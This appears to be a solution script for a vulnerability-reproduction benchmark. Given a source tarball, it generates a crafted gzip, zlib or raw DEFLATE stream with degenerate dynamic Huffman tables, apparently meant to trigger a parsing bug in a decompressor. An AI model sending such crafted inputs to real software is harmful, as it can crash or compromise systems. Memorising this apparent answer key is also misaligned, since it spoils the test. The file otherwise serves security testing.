import os
import struct
import tarfile
import zlib


class _BitWriter:
    __slots__ = ("buf", "acc", "nbits")

    def __init__(self):
        self.buf = bytearray()
        self.acc = 0
        self.nbits = 0

    def write_bits(self, value: int, n: int) -> None:
        acc = self.acc
        nbits = self.nbits
        buf = self.buf
        for i in range(n):
            acc |= ((value >> i) & 1) << nbits
            nbits += 1
            if nbits == 8:
                buf.append(acc)
                acc = 0
                nbits = 0
        self.acc = acc
        self.nbits = nbits

    def finish(self) -> bytes:
        if self.nbits:
            self.buf.append(self.acc)
            self.acc = 0
            self.nbits = 0
        return bytes(self.buf)


def _make_deflate_dynamic_empty(dist_codes: int = 2) -> bytes:
    if dist_codes < 1 or dist_codes > 32:
        dist_codes = 2

    bw = _BitWriter()

    # BFINAL=1, BTYPE=2 (dynamic)
    bw.write_bits(1, 1)
    bw.write_bits(2, 2)

    # HLIT=0 (257 lit/len codes), HDIST=(dist_codes-1), HCLEN=14 (18 code length codes)
    bw.write_bits(0, 5)
    bw.write_bits(dist_codes - 1, 5)
    bw.write_bits(14, 4)

    # Code length alphabet order
    order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]

    # Transmit 18 code length code lengths (for order[0..17]) as 3-bit values.
    # Make only symbols 18 and 1 have code length 1; all others 0.
    for i in range(18):
        sym = order[i]
        clen = 1 if sym == 18 or sym == 1 else 0
        bw.write_bits(clen, 3)

    # Code-length Huffman codes (canonical) with lengths:
    # symbol 1 => code 0 (1 bit), symbol 18 => code 1 (1 bit)

    # Now encode (HLIT+257)=257 lit/len code lengths + (HDIST+1)=dist_codes distance code lengths.
    # Lit/len lengths: symbol 0 -> 1, symbols 1..255 -> 0, symbol 256 (EOB) -> 1.
    # Dist lengths: first dist_codes symbols -> 1.
    # Encode using: 1, then repeat-0 via 18 for 255 zeros, then 1, then dist_codes times 1.

    # literal 0 length = 1  => symbol 1
    bw.write_bits(0, 1)

    # 255 zeros using symbol 18 repeats (11..138)
    remaining = 255
    while remaining > 0:
        run = 138 if remaining >= 138 else remaining
        if run < 11:
            # use a smaller run by splitting: one 18 of 11 and adjust (shouldn't happen here for remaining>=255)
            run = 11
        bw.write_bits(1, 1)  # symbol 18
        bw.write_bits(run - 11, 7)
        remaining -= run

    # literal 256 (EOB) length = 1 => symbol 1
    bw.write_bits(0, 1)

    # distance code lengths: dist_codes times 1 => symbol 1 each
    for _ in range(dist_codes):
        bw.write_bits(0, 1)

    # Compressed data: end-of-block symbol 256 using lit/len Huffman with only symbols 0 and 256 at length 1.
    # Canonical: symbol 0 => 0, symbol 256 => 1. So EOB is '1'.
    bw.write_bits(1, 1)

    return bw.finish()


def _wrap_gzip(deflate_stream: bytes, uncompressed: bytes = b"") -> bytes:
    hdr = b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff"
    crc = zlib.crc32(uncompressed) & 0xFFFFFFFF
    isize = len(uncompressed) & 0xFFFFFFFF
    trailer = struct.pack("<II", crc, isize)
    return hdr + deflate_stream + trailer


def _wrap_zlib(deflate_stream: bytes, uncompressed: bytes = b"") -> bytes:
    # zlib header: 0x78 0x9c (deflate, 32K window, default compression)
    hdr = b"\x78\x9c"
    ad = zlib.adler32(uncompressed) & 0xFFFFFFFF
    trailer = struct.pack(">I", ad)
    return hdr + deflate_stream + trailer


def _guess_wrapper(src_path: str) -> str:
    gzip_score = 0
    zlib_score = 0

    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return "gzip"

    try:
        members = tf.getmembers()
        for m in members:
            if not m.isfile():
                continue
            name = (m.name or "").lower()
            if not name.endswith((".c", ".h", ".cc", ".cpp", ".inc", ".md", ".txt")):
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read(200000)
            except Exception:
                continue

            text = data.decode("latin1", errors="ignore").lower()

            if ".gz" in name or "gzip" in name or "gunzip" in name:
                gzip_score += 2
            if "gzip" in text or "gunzip" in text:
                gzip_score += 2
            if "0x1f" in text and "0x8b" in text:
                gzip_score += 4
            if "isize" in text and "crc32" in text:
                gzip_score += 2
            if "adler32" in text:
                zlib_score += 2
            if "zlib" in text:
                zlib_score += 2
            if "cmf" in text and "flg" in text:
                zlib_score += 1
    finally:
        try:
            tf.close()
        except Exception:
            pass

    if gzip_score >= max(3, zlib_score + 2):
        return "gzip"
    if zlib_score > 0:
        return "zlib"
    return "raw"


class Solution:
    def solve(self, src_path: str) -> bytes:
        deflate_stream = _make_deflate_dynamic_empty(dist_codes=2)

        wrapper = _guess_wrapper(src_path)
        if wrapper == "raw":
            return deflate_stream
        if wrapper == "zlib":
            return _wrap_zlib(deflate_stream, b"")
        return _wrap_gzip(deflate_stream, b"")